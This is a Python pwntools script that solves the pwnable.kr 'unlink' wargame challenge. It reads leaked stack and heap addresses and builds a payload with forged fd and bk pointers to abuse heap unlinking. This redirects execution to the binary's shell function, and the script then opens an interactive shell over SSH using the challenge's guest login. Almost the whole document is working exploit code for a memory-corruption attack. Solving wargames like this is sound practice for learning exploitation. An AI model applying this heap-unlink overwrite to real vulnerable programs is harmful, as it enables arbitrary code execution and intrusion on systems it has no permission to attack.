#!/usr/bin/env python
# coding=utf-8
# author: thinkycx
# date: 2018-11-23
from pwn import *
context.local(arch='i386', os='linux')

def pwn(io):
    if debug: gdb.attach(io)
    io.recvuntil("here is stack address leak: ")
    leakAstack = int(io.recvline(), 16)
    io.recvuntil("here is heap address leak: ")
    leakAheap = int(io.recvline(), 16)
    log.success("Get leakAstack 0x%x & leakBstack 0x%x" % (leakAstack, leakAheap))
    io.recvuntil("now that you have leaks, get shell!")

    shelladdr = elf.symbols['shell']
    ecxaddr = leakAstack + 0x10
    fakefd = ecxaddr - 4
    fakebk = leakAheap + 12
    payload = p32(shelladdr) + p32(1)*2 + p32(0x19) + p32(fakefd) + p32(fakebk)

    io.sendline(payload)

if __name__ == '__main__':
    global io, elf, libc, debug
    local, debug = 0, 0
    # context.log_level = 'debug'
    filename = './unlink'
    elf = ELF(filename)
    if local:
        io = process(filename)
        # context.terminal = ['tmux', '-x', 'sh', '-c']
        context.terminal = ['tmux', 'splitw', '-h' ]
    else:
        con = ssh(host='pwnable.kr', user='unlink', password='guest', port=2222)
        io = con.process('./unlink')
    pwn(io)
    io.interactive()
